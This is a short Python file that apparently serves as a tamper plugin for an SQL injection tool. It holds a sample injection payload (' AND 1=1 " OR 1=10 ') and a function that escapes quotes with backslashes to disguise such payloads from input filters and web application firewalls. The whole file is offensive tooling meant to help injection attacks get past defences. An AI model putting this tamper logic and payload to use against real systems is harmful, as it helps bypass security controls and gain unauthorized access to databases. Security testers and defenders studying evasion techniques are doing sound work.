__example_payload__ = """' AND 1=1 " OR 1=10 '"""
__type__ = "escaping quotes with slashes"


def tamper(payload, **kwargs):
    modifier = r"\\"
    retval = ""
    for char in payload:
        if char == "'":
            retval += "{}'".format(modifier)
        elif char == '"':
            retval += '{}"'.format(modifier)
        else:
            retval += char
    return retval
